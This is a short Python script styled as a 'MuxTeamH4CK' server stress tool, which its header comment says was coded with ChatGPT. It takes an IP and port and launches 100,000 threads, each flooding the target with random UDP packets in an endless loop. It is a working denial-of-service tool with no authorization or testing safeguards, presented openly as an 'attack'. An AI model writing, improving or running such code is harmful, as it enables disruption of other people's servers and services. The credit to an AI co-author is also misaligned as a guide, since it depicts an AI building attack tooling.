import socket
import time
import os
import random
import threading

# Coding by: CHATGPT x EnderBob x ItzMuxGamer
# Sending To Attack Server
def attack(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  while True:
    len = random.randint(256, 512)
    payload = os.urandom(len)
    s.sendto(payload, (ip, port))
os.system("clear")
print("\033[31m")
print("         Server Stress")
print("|==============================|")
print("|      MuxTeamH4CK Stress      |")
print("|==============================|")
print(" ")
print("\033[31m")
ip = input("IP: ")
port = int(input("Port: "))
time.sleep(2)
print(" ")
os.system("clear")
print("\033[31m")
print("           ATTACK INFO")
print("=================================")
print(f"IP: {ip}")
print(f"Port: {port}")
print("Stopped Stress: CTRL + Z")
print("=================================")
print("Successfull Attack Sent To Server")
# Staring Stresser

for i in range(100000):
  t = threading.Thread(target=attack,args=(ip, port), daemon=True)
  t.start()
while True:
  time.sleep(0)
